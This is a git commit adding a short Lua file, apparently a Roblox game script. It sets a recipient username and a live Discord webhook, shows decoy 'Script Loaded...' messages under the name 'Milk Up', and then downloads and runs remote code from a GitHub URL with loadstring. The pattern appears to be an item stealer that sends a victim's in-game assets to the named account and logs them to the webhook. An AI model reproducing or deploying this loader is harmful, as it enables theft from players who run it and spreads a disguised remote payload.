969dc23cb8ba31256ae6a2cfdfa6edb2d0413eb6
Hectotize <74368578+Hectotize@users.noreply.github.com>
2023-06-21 04:37:20 -0700

    Add files via upload

---
+++ obf_QiZ7BWM2ckixdvEi60s2H712l1CNHe8Lru2s4yCoY26tt1JRLJkQY4s5ztuZ4Z0j.lua
@@ -0,0 +1,10 @@
+Username = "whatchadoin22"
+--Username2 = "ReshangSiopaooo" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1117421615316217896/KVBppEWofPCTJ32vjlK3peGHQmstLMbYdImfE538uK8Av_XJoz7Xr4kmeDIZpEeyGXwv"
+loadingscreen = true
+_G.CustomScriptName = "Milk Up"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
